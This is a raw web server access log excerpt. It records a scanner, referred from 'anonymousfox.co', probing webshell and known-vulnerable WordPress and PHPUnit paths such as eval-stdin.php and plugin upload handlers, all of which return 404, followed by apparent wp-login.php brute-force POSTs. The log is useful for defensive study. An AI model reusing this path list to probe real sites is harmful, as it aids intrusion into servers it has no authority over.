157.90.85.34 - - [28/Jun/2021:22:09:56 -0400] "GET /upload.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:09:58 -0400] "GET /config.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:10:00 -0400] "GET /test.php?Ghost=send HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:10:02 -0400] "GET /wp-content/langar.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:10:04 -0400] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:10:07 -0400] "GET /wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
157.90.85.34 - - [28/Jun/2021:22:10:09 -0400] "GET /wp-content/plugins/wpdiscuz/themes/default/style-rtl.css HTTP/1.1" 404 5068 "anonymousfox.co" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
213.172.4.49 - - [28/Jun/2021:22:11:31 -0400] "POST /wp-login.php HTTP/1.1" 200 9935 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
83.220.174.114 - - [28/Jun/2021:22:33:26 -0400] "POST /wp-login.php HTTP/1.1" 200 9937 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36"
66.249.79.180 - - [28/Jun/2021:22:39:06 -0400] "GET /robots.txt HTTP/1.1" 404 5705 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
